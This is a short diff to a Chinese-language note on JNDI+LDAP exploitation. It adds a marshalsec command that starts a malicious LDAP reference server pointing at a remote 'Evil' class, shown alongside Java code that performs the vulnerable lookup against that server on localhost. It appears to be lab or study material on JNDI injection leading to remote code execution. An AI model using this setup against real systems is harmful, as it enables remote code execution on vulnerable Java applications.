@@ -9,6 +9,9 @@
 ## **JNDI+LDAP利用方式**
 使用marshalsec启动一个恶意的LDAP服务，可以执行恶意方法。
 ```
+java -cp marshalsec-0.0.3-SNAPSH0T-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Evil 10997
+```
+```
 public static void main(String[] args) throws NamingException {
     InitialContext context = new InitialContext();
     context.lookup( "ldap://127.0.0.1:10997/evil");
